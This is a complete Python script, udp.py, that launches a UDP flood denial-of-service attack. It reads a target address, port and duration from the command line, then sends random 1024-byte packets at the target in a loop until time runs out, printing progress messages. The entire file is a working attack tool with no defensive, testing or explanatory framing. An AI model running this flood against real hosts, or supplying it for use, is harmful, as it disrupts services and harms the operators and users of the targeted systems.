import socket
import time
import random
import sys

def attack(target, port, duration):
    t_end = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Random payload for UDP flood
    bytes_to_send = random._urandom(1024)
    sent = 0
    
    print(f"[*] Starting UDP flood on {target}:{port} for {duration}s")
    
    try:
        while time.time() < t_end:
            sock.sendto(bytes_to_send, (target, port))
            sent += 1
    except Exception as e:
        print(f"Error: {e}")
        
    print(f"[*] UDP flood finished. Packets sent: {sent}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: udp.py <target> <port> <duration>")
        sys.exit(1)
        
    target = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])
    
    attack(target, port, duration)
